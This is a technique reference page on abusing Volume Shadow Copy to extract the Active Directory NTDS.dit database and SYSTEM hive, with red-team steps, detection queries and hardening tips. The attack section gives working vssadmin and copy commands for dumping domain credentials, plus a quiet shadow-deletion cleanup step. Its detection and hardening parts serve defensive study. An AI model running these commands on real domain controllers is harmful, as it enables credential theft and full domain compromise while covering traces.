# [CA-DUMP-007]: VSS NTDS.dit Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-007 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Using the Volume Shadow Copy Service (VSS) to copy the `NTDS.dit` file while it is locked by the OS. This is stealthier than `ntdsutil` IFM as it uses standard backup APIs often whitelisted by EDRs.
- **Attack Surface:** `vssadmin`, `diskshadow`, or WMI VSS classes.
- **Business Impact:** **Total Domain Compromise**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Administrator / Backup Operator.
- **Tools:**
    - `vssadmin`
    - `diskshadow`
    - [Vssown.vbs](https://github.com/lanmaster53/ptscripts)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create Shadow Copy**
```cmd
vssadmin create shadow /for=C:
# Note the Shadow Copy Volume Name (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)
```

**Step 2: Copy Files**
Copy NTDS and SYSTEM hive from the shadow volume.
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

**Step 3: Cleanup**
```cmd
vssadmin delete shadows /for=C: /quiet
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4688 | `vssadmin.exe` with `create shadow`. |
| **VolSnap** | 33 | "The oldest shadow copy of volume C: was deleted" (indicates rotation/deletion). |

#### 5.2 Sentinel (KQL)
```kusto
ProcessCreationEvents
| where FileName =~ "vssadmin.exe"
| where ProcessCommandLine has "create" and ProcessCommandLine has "shadow"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Monitoring:** Alert on any execution of `vssadmin` or `diskshadow` on Domain Controllers.
*   **Permissions:** Remove Backup Operators from standard admin groups if not required.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001]
> **Next Logical Step:** [LAT-AD-003]
